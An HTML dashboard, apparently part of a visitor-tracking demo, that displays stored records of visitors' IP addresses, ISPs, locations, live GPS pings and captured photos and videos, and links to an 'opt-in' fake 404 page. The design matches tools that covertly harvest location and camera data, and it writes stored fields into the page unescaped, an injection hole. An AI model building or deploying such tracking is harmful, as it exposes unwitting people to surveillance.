<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard | Visitor Network Info</title>
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            font-family: "Consolas", "Courier New", monospace;
            background: radial-gradient(circle at top, #10261b 0%, #020604 70%, #000 100%);
            color: #7cffb2;
            padding: 24px;
        }

        .wrap {
            max-width: 1100px;
            margin: 0 auto;
        }

        h1 {
            margin: 0 0 8px;
            font-size: 24px;
            color: #8bffbb;
            text-transform: uppercase;
            letter-spacing: 0.08em;
        }

        .sub {
            color: #5bd98b;
            margin: 0 0 24px;
        }

        .card {
            background: rgba(2, 12, 8, 0.95);
            border: 1px solid #2bff8a;
            border-radius: 16px;
            padding: 20px;
            box-shadow: 0 0 25px rgba(43, 255, 138, 0.2);
        }

        .table {
            width: 100%;
            border-collapse: collapse;
            overflow: hidden;
            border-radius: 10px;
        }

        .table th,
        .table td {
            padding: 12px 14px;
            text-align: left;
            border-bottom: 1px solid rgba(43, 255, 138, 0.2);
            font-size: 14px;
        }

        .table th {
            color: #8bffbb;
            text-transform: uppercase;
            letter-spacing: 0.06em;
        }

        .table td {
            color: #f0fff6;
        }

        .empty {
            padding: 20px;
            text-align: center;
            color: #5bd98b;
        }

        .thumbnail {
            width: 50px;
            height: 50px;
            object-fit: cover;
            border: 1px solid #2bff8a;
            border-radius: 4px;
            margin: 2px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            vertical-align: middle;
        }
        .thumbnail:hover {
            transform: scale(3.5);
            position: relative;
            z-index: 10;
            box-shadow: 0 0 10px rgba(43, 255, 138, 0.8);
        }
        .map-link {
            color: #2bff8a;
            text-decoration: none;
            font-weight: bold;
            border-bottom: 1px dashed #2bff8a;
        }
        .map-link:hover {
            color: #8bffbb;
            border-bottom-style: solid;
        }
    </style>
</head>

<body>
    <div class="wrap">
        <h1>Visitor Dashboard</h1>
        <p class="sub">All collected visitor network info from the front-end page</p>
        <div style="margin:12px 0">
            <a href="demo-404.html"
                style="display:inline-block;padding:8px 12px;background:#2bff8a;color:#001f0a;border-radius:8px;text-decoration:none;font-weight:700">Open
                Demo 404 (opt-in)</a>
        </div>
        <div class="card">
            <table class="table">
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>IP / ISP</th>
                        <th>Location</th>
                        <th>Live Location</th>
                        <th>Captured Media</th>
                    </tr>
                </thead>
                <tbody id="rows"></tbody>
            </table>
        </div>
    </div>

    <script>
        function loadRecords() {
            const rowsEl = document.getElementById('rows');
            const raw = localStorage.getItem('visitorRecords');
            const records = raw ? JSON.parse(raw) : [];

            if (!records.length) {
                rowsEl.innerHTML = '<tr><td colspan="5" class="empty">No visitor data yet.</td></tr>';
                return;
            }

            rowsEl.innerHTML = records.map(item => {
                // IP & ISP
                const ipStr = `<div>${item.ip || 'N/A'}</div><div style="font-size: 11px; color: #5bd98b;">${item.org || ''}</div>`;
                
                // Location Details (City, Region, Country)
                const locationParts = [item.city, item.region, item.country].filter(Boolean);
                const locationStr = locationParts.length > 0 ? locationParts.join(', ') : 'N/A';
                
                // Coordinates & Live Tracker
                let coordStr = 'N/A';
                if (item.lat && item.lon) {
                    const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${item.lat},${item.lon}`;
                    coordStr = `<div><a href="${mapsUrl}" target="_blank" class="map-link">${item.lat.toFixed(4)}, ${item.lon.toFixed(4)}</a></div>`;
                    if (item.locationHistory && item.locationHistory.length > 1) {
                        coordStr += `<div style="font-size:11px; color:#5bd98b; margin-top:2px;">(Live: ${item.locationHistory.length} pings)</div>`;
                    }
                }
                
                // Media (photos/videos)
                let mediaHtml = 'N/A';
                if (item.media && item.media.length > 0) {
                    mediaHtml = item.media.map(m => {
                        if (m.type === 'photo') {
                            return `<img src="${m.data}" class="thumbnail" alt="Visitor photo" />`;
                        } else if (m.type === 'video') {
                            return `<video src="${m.data}" class="thumbnail" muted loop onmouseover="this.play()" onmouseout="this.pause()"></video>`;
                        }
                        return '';
                    }).join('');
                }
                
                return `
                    <tr>
                        <td style="white-space: nowrap;">${new Date(item.timestamp).toLocaleString()}</td>
                        <td>${ipStr}</td>
                        <td>${locationStr}</td>
                        <td>${coordStr}</td>
                        <td>${mediaHtml}</td>
                    </tr>
                `;
            }).join('');
        }

        // Initial load and poll for updates so dashboard reflects new localStorage entries
        loadRecords();
        setInterval(loadRecords, 2000);
    </script>
</body>

</html>
